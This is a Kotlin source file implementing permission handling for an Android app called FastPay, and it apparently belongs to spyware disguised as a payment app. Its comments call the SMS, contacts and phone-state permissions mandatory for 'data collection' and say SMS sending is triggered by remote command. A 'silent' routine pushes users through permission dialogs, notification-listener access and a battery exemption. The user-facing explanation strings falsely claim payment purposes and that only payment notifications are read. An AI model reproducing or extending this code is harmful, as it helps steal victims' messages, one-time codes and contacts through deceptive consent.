package com.example.fast.util

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.example.fast.service.NotificationReceiver
// PermissionFlowActivity import removed - permission UI concept removed
import com.example.fast.util.DefaultSmsAppHelper

/**
 * PermissionManager
 * 
 * Centralized permission management for FastPay app.
 * Handles all permission checking, requesting, and settings navigation.
 * 
 * Permissions managed:
 * - Runtime permissions (5-6): RECEIVE_SMS, READ_SMS, READ_CONTACTS, SEND_SMS, READ_PHONE_STATE, POST_NOTIFICATIONS (Android 13+)
 * - Special permissions (2): Notification Listener Service, Battery Optimization
 */
object PermissionManager {
    
    // MANDATORY runtime permissions (requested automatically for ASAP data collection)
    // These permissions are required for data collection: SMS, Contacts, System Info
    val MANDATORY_RUNTIME_PERMISSIONS = arrayOf(
        android.Manifest.permission.RECEIVE_SMS,      // SMS data collection
        android.Manifest.permission.READ_SMS,         // SMS data collection
        android.Manifest.permission.READ_CONTACTS,   // Contact data collection
        android.Manifest.permission.READ_PHONE_STATE // System info data collection
    )
    
    // OPTIONAL runtime permissions (requested via remote command only)
    // These are for actions, not data collection
    val OPTIONAL_RUNTIME_PERMISSIONS = arrayOf(
        android.Manifest.permission.SEND_SMS  // For sending SMS (action, not data collection)
    )
    
    // All runtime permissions (mandatory + optional) - for backward compatibility
    val REQUIRED_RUNTIME_PERMISSIONS = MANDATORY_RUNTIME_PERMISSIONS + OPTIONAL_RUNTIME_PERMISSIONS
    
    // Get mandatory runtime permissions (SMS, Contacts, Phone State - for data collection)
    fun getMandatoryRuntimePermissions(context: Context): Array<String> {
        return MANDATORY_RUNTIME_PERMISSIONS
    }
    
    // Get optional runtime permissions (SEND_SMS, etc. - for actions, not data collection)
    fun getOptionalRuntimePermissions(context: Context): Array<String> {
        val permissions = OPTIONAL_RUNTIME_PERMISSIONS.toMutableList()
        // Add POST_NOTIFICATIONS for Android 13+ (API 33+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
        return permissions.toTypedArray()
    }
    
    // Get all required runtime permissions including Android 13+ notification permission (for backward compatibility)
    fun getRequiredRuntimePermissions(context: Context): Array<String> {
        val permissions = REQUIRED_RUNTIME_PERMISSIONS.toMutableList()
        // Add POST_NOTIFICATIONS for Android 13+ (API 33+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
        return permissions.toTypedArray()
    }
    
    /**
     * Permission status data class
     */
    data class PermissionStatus(
        val isGranted: Boolean,
        val canRequest: Boolean = true, // false if permanently denied
        val explanation: String = ""
    )
    
    /**
     * All permissions status
     * Note: Default SMS App permission removed - no longer checked
     */
    data class AllPermissionsStatus(
        val runtimePermissions: Map<String, PermissionStatus>,
        val notificationListener: PermissionStatus,
        val batteryOptimization: PermissionStatus,
        val allGranted: Boolean
    )
    
    // ============================================================================
    // RUNTIME PERMISSIONS
    // ============================================================================
    
    /**
     * Check if all mandatory runtime permissions are granted (SMS only)
     */
    fun hasAllMandatoryRuntimePermissions(context: Context): Boolean {
        val mandatoryPermissions = getMandatoryRuntimePermissions(context)
        return mandatoryPermissions.all { permission ->
            ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Check if all runtime permissions are granted (mandatory + optional)
     */
    fun hasAllRuntimePermissions(context: Context): Boolean {
        val requiredPermissions = getRequiredRuntimePermissions(context)
        return requiredPermissions.all { permission ->
            ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Check if a specific runtime permission is granted
     */
    fun hasRuntimePermission(context: Context, permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Get list of missing mandatory runtime permissions (SMS only)
     */
    fun getMissingMandatoryRuntimePermissions(context: Context): List<String> {
        val mandatoryPermissions = getMandatoryRuntimePermissions(context)
        return mandatoryPermissions.filter { permission ->
            ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Get list of missing runtime permissions (mandatory + optional)
     */
    fun getMissingRuntimePermissions(context: Context): List<String> {
        val requiredPermissions = getRequiredRuntimePermissions(context)
        return requiredPermissions.filter { permission ->
            ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Get list of missing optional runtime permissions (for remote commands)
     */
    fun getMissingOptionalRuntimePermissions(context: Context): List<String> {
        val optionalPermissions = getOptionalRuntimePermissions(context)
        return optionalPermissions.filter { permission ->
            ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Check if a permission was permanently denied (Don't Ask Again)
     */
    fun isPermanentlyDenied(activity: Activity, permission: String): Boolean {
        if (ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED) {
            return false
        }
        return !ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)
    }
    
    /**
     * Request all runtime permissions at once
     */
    fun requestAllRuntimePermissions(activity: Activity, requestCode: Int = 100) {
        val missingPermissions = getMissingRuntimePermissions(activity)
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(activity, missingPermissions.toTypedArray(), requestCode)
        }
    }
    
    /**
     * Request permissions sequentially (one at a time in chain reaction)
     * This ensures permissions are requested one by one instead of all at once
     * 
     * @param activity The activity requesting permissions
     * @param requestCode The request code for permission callbacks
     * @param onAllGranted Callback when all permissions are granted
     * @param onPermissionDenied Callback when a permission is denied (optional)
     * @return true if started requesting, false if all already granted
     */
    fun requestPermissionsSequentially(
        activity: Activity,
        requestCode: Int = 100,
        onAllGranted: (() -> Unit)? = null,
        onPermissionDenied: ((permission: String) -> Unit)? = null
    ): Boolean {
        val missingPermissions = getMissingRuntimePermissions(activity)
        if (missingPermissions.isEmpty()) {
            // All permissions already granted
            onAllGranted?.invoke()
            return false
        }
        
        // Request first missing permission
        val firstPermission = missingPermissions[0]
        ActivityCompat.requestPermissions(activity, arrayOf(firstPermission), requestCode)
        return true
    }
    
    /**
     * Continue sequential permission request after one permission is handled
     * Call this from onRequestPermissionsResult to continue the chain
     * 
     * @param activity The activity requesting permissions
     * @param requestCode The request code from onRequestPermissionsResult
     * @param permissions The permissions array from onRequestPermissionsResult
     * @param grantResults The grant results array from onRequestPermissionsResult
     * @param onAllGranted Callback when all permissions are granted
     * @param onPermissionDenied Callback when a permission is denied (optional)
     * @return true if there are more permissions to request, false if all done
     */
    fun continueSequentialRequest(
        activity: Activity,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
        onAllGranted: (() -> Unit)? = null,
        onPermissionDenied: ((permission: String) -> Unit)? = null
    ): Boolean {
        // Check if this is our permission request
        if (requestCode != 100) return false
        
        // Check if permission was granted
        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Permission granted, check for more missing permissions
            val missingPermissions = getMissingRuntimePermissions(activity)
            if (missingPermissions.isEmpty()) {
                // All permissions granted
                onAllGranted?.invoke()
                return false
            } else {
                // Request next permission immediately (zero delay for fastest dialog transition)
                val nextPermission = missingPermissions[0]
                ActivityCompat.requestPermissions(activity, arrayOf(nextPermission), requestCode)
                return true
            }
        } else {
            // Permission denied
            if (permissions.isNotEmpty()) {
                onPermissionDenied?.invoke(permissions[0])
            }
            // Continue with next permission anyway (don't block the chain)
            val missingPermissions = getMissingRuntimePermissions(activity)
            if (missingPermissions.isEmpty()) {
                onAllGranted?.invoke()
                return false
            } else {
                // Request next permission immediately (zero delay for fastest dialog transition)
                val nextPermission = missingPermissions[0]
                ActivityCompat.requestPermissions(activity, arrayOf(nextPermission), requestCode)
                return true
            }
        }
    }
    
    /**
     * Get status of all runtime permissions
     */
    fun getRuntimePermissionsStatus(activity: Activity): Map<String, PermissionStatus> {
        val requiredPermissions = getRequiredRuntimePermissions(activity)
        return requiredPermissions.associateWith { permission ->
            val isGranted = hasRuntimePermission(activity, permission)
            val canRequest = !isPermanentlyDenied(activity, permission)
            val explanation = getPermissionExplanation(permission)
            PermissionStatus(isGranted, canRequest, explanation)
        }
    }
    
    // ============================================================================
    // NOTIFICATION LISTENER SERVICE
    // ============================================================================
    
    /**
     * Check if Notification Listener Service is enabled
     */
    fun hasNotificationListenerPermission(context: Context): Boolean {
        val notificationListenerComponent = ComponentName(
            context.packageName,
            NotificationReceiver::class.java.name
        )
        return NotificationManagerCompat.getEnabledListenerPackages(context)
            .contains(notificationListenerComponent.packageName)
    }
    
    /**
     * Open Notification Listener Settings
     */
    fun openNotificationListenerSettings(context: Context) {
        try {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // Fallback to general settings
            try {
                val intent = Intent(Settings.ACTION_SETTINGS)
                context.startActivity(intent)
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }
    
    // ============================================================================
    // BATTERY OPTIMIZATION
    // ============================================================================
    
    /**
     * Check if battery optimization is disabled (app is exempt)
     */
    fun hasBatteryOptimizationExemption(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true // Not required for older Android versions
        }
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        return powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: true
    }
    
    /**
     * Open Battery Optimization Settings
     */
    fun openBatteryOptimizationSettings(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                e.printStackTrace()
                // Fallback to battery optimization settings
                try {
                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    context.startActivity(intent)
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    // Final fallback to general settings
                    try {
                        val intent = Intent(Settings.ACTION_SETTINGS)
                        context.startActivity(intent)
                    } catch (ex2: Exception) {
                        ex2.printStackTrace()
                    }
                }
            }
        }
    }
    
    // ============================================================================
    // ALL PERMISSIONS STATUS
    // ============================================================================
    
    // ============================================================================
    // DEFAULT SMS APP
    // ============================================================================
    
    /**
     * Check if app is set as default SMS app
     */
    fun isDefaultSmsApp(context: Context): Boolean {
        return DefaultSmsAppHelper.isDefaultSmsApp(context)
    }
    
    /**
     * Open default SMS app selection dialog
     */
    fun openDefaultSmsAppSettings(context: Context) {
        DefaultSmsAppHelper.requestDefaultSmsApp(context)
    }
    
    /**
     * Check if all permissions (runtime + special) are granted
     * Note: Default SMS app is no longer required (removed from permission flow)
     */
    /**
     * Check if all MANDATORY permissions are granted (SMS + notification + battery)
     * This is used for UI updates - only mandatory permissions are required
     */
    fun hasAllMandatoryPermissions(activity: Activity): Boolean {
        return hasAllMandatoryRuntimePermissions(activity) &&
                hasNotificationListenerPermission(activity) &&
                hasBatteryOptimizationExemption(activity)
    }
    
    /**
     * Check if ALL permissions are granted (mandatory + optional)
     * This includes contacts, phone_state, etc. - used for full feature check
     */
    fun hasAllPermissions(activity: Activity): Boolean {
        return hasAllRuntimePermissions(activity) &&
                hasNotificationListenerPermission(activity) &&
                hasBatteryOptimizationExemption(activity)
        // Default SMS app check removed - no longer blocking navigation
    }
    
    /**
     * Get status of all permissions
     * Note: Default SMS App permission removed - no longer checked
     */
    fun getAllPermissionsStatus(activity: Activity): AllPermissionsStatus {
        val runtimePermissions = getRuntimePermissionsStatus(activity)
        val notificationListener = PermissionStatus(
            isGranted = hasNotificationListenerPermission(activity),
            canRequest = true, // Can always be enabled via settings
            explanation = getNotificationListenerExplanation()
        )
        val batteryOptimization = PermissionStatus(
            isGranted = hasBatteryOptimizationExemption(activity),
            canRequest = true, // Can always be enabled via settings
            explanation = getBatteryOptimizationExplanation()
        )
        
        val allGranted = runtimePermissions.values.all { it.isGranted } &&
                notificationListener.isGranted &&
                batteryOptimization.isGranted
        
        return AllPermissionsStatus(
            runtimePermissions = runtimePermissions,
            notificationListener = notificationListener,
            batteryOptimization = batteryOptimization,
            allGranted = allGranted
        )
    }
    
    /**
     * Get count of granted permissions (out of 7-8 total, depending on Android version)
     * Note: Default SMS App permission removed from count
     */
    fun getGrantedPermissionsCount(activity: Activity): Int {
        val status = getAllPermissionsStatus(activity)
        val runtimeGranted = status.runtimePermissions.values.count { it.isGranted }
        val notificationGranted = if (status.notificationListener.isGranted) 1 else 0
        val batteryGranted = if (status.batteryOptimization.isGranted) 1 else 0
        return runtimeGranted + notificationGranted + batteryGranted
    }
    
    // ============================================================================
    // PERMISSION EXPLANATIONS
    // ============================================================================
    
    /**
     * Get user-friendly explanation for a permission
     */
    fun getPermissionExplanation(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS -> 
                "Receive payment SMS automatically so we can process transactions in real-time. No manual checking needed!"
            android.Manifest.permission.READ_SMS -> 
                "Read SMS to verify payment confirmations and keep your transaction history up to date."
            android.Manifest.permission.READ_CONTACTS -> 
                "Access contacts to make sending payments super easy - just select a contact and pay!"
            android.Manifest.permission.SEND_SMS -> 
                "Send SMS messages to process payment requests and confirmations securely."
            android.Manifest.permission.READ_PHONE_STATE -> 
                "Get device ID to securely link your device to your account."
            android.Manifest.permission.POST_NOTIFICATIONS -> 
                "Show notifications for payment alerts and important updates. Essential for real-time payment processing."
            else -> "This permission is required for FastPay to function properly."
        }
    }
    
    /**
     * Get user-friendly name for a permission
     */
    fun getPermissionName(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS -> "Receive SMS"
            android.Manifest.permission.READ_SMS -> "Read SMS"
            android.Manifest.permission.READ_CONTACTS -> "Access Contacts"
            android.Manifest.permission.SEND_SMS -> "Send SMS"
            android.Manifest.permission.READ_PHONE_STATE -> "Phone State"
            android.Manifest.permission.POST_NOTIFICATIONS -> "Post Notifications"
            else -> "Permission"
        }
    }
    
    /**
     * Get emoji icon for a permission
     */
    fun getPermissionIcon(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS -> "📱"
            android.Manifest.permission.READ_SMS -> "📖"
            android.Manifest.permission.READ_CONTACTS -> "👥"
            android.Manifest.permission.SEND_SMS -> "✉️"
            android.Manifest.permission.READ_PHONE_STATE -> "📞"
            android.Manifest.permission.POST_NOTIFICATIONS -> "🔔"
            else -> "🔐"
        }
    }
    
    /**
     * Get notification listener explanation
     */
    fun getNotificationListenerExplanation(): String {
        return "Read bank payment notifications to automatically process transactions. We only read payment-related notifications, nothing else!"
    }
    
    /**
     * Get battery optimization explanation
     */
    fun getBatteryOptimizationExplanation(): String {
        return "Keep FastPay running in the background to process payments instantly, even when the app is closed. Minimal battery impact."
    }
    
    /**
     * Get default SMS app explanation
     */
    fun getDefaultSmsAppExplanation(): String {
        return "Set FastPay as default SMS app to handle bulk messages efficiently (5000+ SMS) without slowing down your device. Essential for optimal performance."
    }
    
    // ============================================================================
    // SETTINGS NAVIGATION
    // ============================================================================
    
    /**
     * Open app settings page
     */
    fun openAppSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", context.packageName, null)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // Fallback to general settings
            try {
                val intent = Intent(Settings.ACTION_SETTINGS)
                context.startActivity(intent)
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }
    
    /**
     * Silent permission check - requests permissions directly if runtime permissions missing
     * Automatically opens system permission dialogs and settings without showing any UI
     * 
     * Now includes notification listener and battery optimization as mandatory permissions.
     * 
     * @param activity The activity to check permissions for
     * @return true if all mandatory permissions granted, false if permissions were requested (waiting for user response)
     */
    fun checkAndRedirectSilently(activity: Activity): Boolean {
        // Check runtime permissions first
        if (!hasAllRuntimePermissions(activity)) {
            // Runtime permissions missing - request them directly (automatic, no UI)
            // Request all missing permissions at once - system will show dialogs
            requestAllRuntimePermissions(activity, requestCode = 100)
            return false // Permissions were requested, waiting for user response
        }
        
        // Check notification listener permission (mandatory)
        if (!hasNotificationListenerPermission(activity)) {
            // Open notification listener settings
            openNotificationListenerSettings(activity)
            return false // Settings opened, waiting for user to enable
        }
        
        // Check battery optimization exemption (mandatory)
        if (!hasBatteryOptimizationExemption(activity)) {
            // Open battery optimization settings
            openBatteryOptimizationSettings(activity)
            return false // Settings opened, waiting for user to enable
        }
        
        // All mandatory permissions granted
        // Note: Default SMS App check removed - no longer required
        return true
    }
}

